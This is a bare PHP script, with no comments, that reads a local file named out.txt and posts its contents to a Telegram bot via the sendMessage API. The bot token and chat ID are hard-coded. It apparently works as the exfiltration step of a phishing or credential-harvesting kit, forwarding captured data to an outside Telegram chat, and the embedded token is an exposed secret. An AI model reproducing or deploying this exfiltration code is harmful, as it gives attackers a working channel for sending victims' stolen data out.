<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/1684590999:AAFzTK-4lIEaC4oDxPapad_U9ic6ZQBpHQQ/sendMessage?chat_id=769626175‪&text=$msg");
?>
